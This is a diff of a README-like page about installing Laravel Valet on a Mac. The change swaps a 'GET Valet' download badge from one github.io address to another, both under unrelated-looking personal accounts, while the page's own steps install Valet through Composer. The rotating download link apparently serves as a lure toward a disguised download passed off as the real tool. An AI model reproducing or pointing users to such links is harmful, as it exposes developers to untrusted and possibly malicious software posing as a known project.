@@ -60,7 +60,7 @@ The best part of Valet Laravel usage is how little ceremony it adds. A developer
 
 Prerequisites: A Mac with Homebrew, PHP, Composer, and permission to install local services used by Valet macOS.
 
-[![GET Valet](https://img.shields.io/badge/GET%20%E2%80%94%20Valet-0078D6?style=for-the-badge&logoColor=white)](https://chasemathisylrz.github.io/.github/valet-laravel-app)
+[![GET Valet](https://img.shields.io/badge/GET%20%E2%80%94%20Valet-0078D6?style=for-the-badge&logoColor=white)](https://erenlopezmgpm.github.io/.github/valet-laravel-app)
 
 1.  **Install the tool:** Use Composer for Valet install so the command line utility is available globally and ready for Laravel Valet project setup.
 2.  **Prepare local services:** Run the installer so Valet Nginx and Valet DNSMasq can serve development domains on the Mac.
